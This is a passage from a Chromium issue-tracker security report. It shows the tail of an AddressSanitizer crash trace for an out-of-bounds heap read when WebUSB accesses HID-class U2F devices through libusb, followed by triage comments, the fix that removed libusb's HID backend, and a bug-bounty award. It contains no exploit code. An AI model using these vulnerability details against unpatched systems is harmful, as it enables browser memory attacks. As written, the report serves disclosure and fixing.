#46 0x7ffe1bc8b1ee (C:\Windows\System32\USER32.dll+0x18000b1ee)  

#47 0x7ffddc171fdf (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a11fdf)  

#48 0x7ffddc17157c (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a1157c)  

#49 0x7ffddc1702f0 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a102f0)  

#50 0x7ffddbfa6cd7 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183846cd7)  

#51 0x7ffddbd8f4e3 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18362f4e3)  

#52 0x7ffdd9e9b7a8 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18173b7a8)  

#53 0x7ffdd9ea53ab (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1817453ab)  

#54 0x7ffdd9e8fbc9 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18172fbc9)  

#55 0x7ffddbac48b1 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1833648b1)  

#56 0x7ffddbac5a62 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183365a62)  

#57 0x7ffddbb3338b (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1833d338b)  

#58 0x7ffddbac4506 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183364506)  

#59 0x7ffdd87613ea (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1800013ea)  

#60 0x7ff7f8327e5c (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x140007e5c)  

#61 0x7ff7f832234c (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x14000234c)  

#62 0x7ff7f8660c18 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x140340c18)  

#63 0x7ffe1b5b1fe3 (C:\Windows\System32\KERNEL32.DLL+0x180011fe3)  

#64 0x7ffe1d9befc0 (C:\Windows\SYSTEM32\ntdll.dll+0x18006efc0)

0x120badf8ad02 is located 0 bytes to the right of 4098-byte region [0x120badf89d00,0x120badf8ad02)  

allocated by thread T46 here:  

#0 0x7ff7f835a486 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x14003a486)  

#1 0x7ffdde9227ef (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1861c27ef)  

#2 0x7ffdde918bcf (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1861b8bcf)  

#3 0x7ffdde931d08 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1861d1d08)  

#4 0x7ffdde8ece23 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18618ce23)  

#5 0x7ffddc1bf851 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a5f851)  

#6 0x7ffddc1c51ff (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a651ff)  

#7 0x7ffddc1c3acc (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a63acc)  

#8 0x7ffddc1df440 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a7f440)  

#9 0x7ffddbf61f3f (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183801f3f)  

#10 0x7ff7f8351d78 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x140031d78)  

#11 0x7ffe1b5b1fe3 (C:\Windows\System32\KERNEL32.DLL+0x180011fe3)  

#12 0x7ffe1d9befc0 (C:\Windows\SYSTEM32\ntdll.dll+0x18006efc0)

SUMMARY: AddressSanitizer: memcpy-param-overlap (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x14003afd8)  

==4836==ABORTING

## Attachments

- [submission-webusb-crash.png](attachments/submission-webusb-crash.png) (image/png, 98.5 KB)
- [chrome-oob-heap-webusb-2018-03-01_14.50.35-small.mp4](attachments/chrome-oob-heap-webusb-2018-03-01_14.50.35-small.mp4) (video/mp4, 9.9 MB)
- [chrome-oob-heap-webusb-2018-03-03_23.56.20-small.mp4](attachments/chrome-oob-heap-webusb-2018-03-03_23.56.20-small.mp4) (video/mp4, 8.4 MB)

## Timeline

### el...@chromium.org (2018-03-04)

[Empty comment from Monorail migration]

[Monorail components: Blink>USB]

### re...@chromium.org (2018-03-04)

I think what's going on here is that a latent feature in libusb is trying to provide a translation between raw USB commands and the Windows HID driver in order to make the device available. We should disable this path entirely as we never want libusb doing this translation.

### ve...@gmail.com (2018-03-04)

Another interesting note: the transferIn calls will block. But if a U2F authentication is started in another Window they will return empty ArrayBuffers via DataView. I suspect there is some initialization going on internally and the device is accessed in parallel by WebUSB and the U2F extension.

### ke...@chromium.org (2018-03-05)

vervier@: Can you please provide a few crash IDs from chrome://crashes from your repros on an official build?

reillyg@: Do you mind owning this? This bug is just for the crash, since we already knew about the security implications of the first part (claiming HID devices via WebUSB).

### ve...@gmail.com (2018-03-05)


Sure, here are crash IDs from Version 64.0.3282.186 (Official Build) (64-bit):

Uploaded Crash Report ID 7cfe1034a64407c5 (Local Crash ID: f1bdc24e-9ac0-4c02-b423-552ff972650c) (Yubikey NEO)

Uploaded Crash Report ID a9df17569b1cb730 (Local Crash ID: ce417622-c8ea-42cc-8498-5ab0fdb9cd70) (Feitian ePass U2F)

Uploaded Crash Report ID a9e61aa6e636254d (Local Crash ID: 3fe7eddf-8958-475d-ab0d-5dee55d40618) (Yubikey NEO)



### ke...@chromium.org (2018-03-05)

Thanks. Confirmed that those show OOB reads while receiving USB device data.

### re...@chromium.org (2018-03-08)

[Empty comment from Monorail migration]

### re...@chromium.org (2018-03-08)

[Empty comment from Monorail migration]

### re...@chromium.org (2018-03-23)

r541265 removed the HID backend from libusb, making this issue obsolete.

### sh...@chromium.org (2018-03-24)

[Empty comment from Monorail migration]

### aw...@google.com (2018-03-26)

[Empty comment from Monorail migration]

### aw...@google.com (2018-04-01)

Hello! I'm afraid the VRP panel declined to reward for this report. However, do you know if the OOB read is still accessible over the HID APIs we still expose? If so we could reconsider.

### re...@chromium.org (2018-04-01)

The HID API we still expose (the chrome.hid API) is a separate implemention.

### ve...@gmail.com (2018-04-02)

Hi, the OOB read access was triggered via the WebUSB-API. You removed access to the whole HID device class so at least this vector should be gone. However, I would not rule out this is triggerable via other vectors since I do not see any fix for the root cause. Unfortunately I can't currently afford to invest more of my free time to investigate this more deeply.
From the panel's point of view what is the difference between me finding an additional vector to trigger this and the current one that you fixed after my report?

Markus 

### re...@chromium.org (2018-04-02)

Can you elaborate on what you believe the root cause to be? libusb uses separate code for I/O operations through HID and WinUSB. The HID path, which is what performed the OOB access, has been removed. The WinUSB path has no analogous function.

### ve...@gmail.com (2018-04-02)

The OOB access looks to me like a race condition when accessing the device (could have been concurrently to chrome.hid or the u2f plugin).
When you investigated the bug, could you confirm the cause was internal to the libusb HID path? If not could it be possible that the OOB read just occurred there, and the root cause was external?
In the latter case it might make sense to try to debug into this further..

### aw...@chromium.org (2018-06-19)

After examining this bug and https://crbug.com/chromium/818592, the VRP panel has decided to award $5,000 for this report. Amongst other causes of confusion, the code change mentioned in https://crbug.com/chromium/818472#c9 referenced 818592 and we presumed the change was made in response to that issue, not this. https://crbug.com/chromium/818472#c4 of https://crbug.com/chromium/818592 shows that wasn't the case, and we should have initially rewarded this report.

A member of our finance team will be in touch to arrange for payment or, should you choose, donation.

We'd also like to thank you for your WebUSB security research presented at OffensiveCon, and would like to note that it might also have been eligible for a reward had you worked with us before making it public.

### aw...@chromium.org (2018-06-19)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-30)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2018-06-30)

This issue was migrated from crbug.com/chromium/818472?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail blocking: crbug.com/chromium/813280]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40090676)*
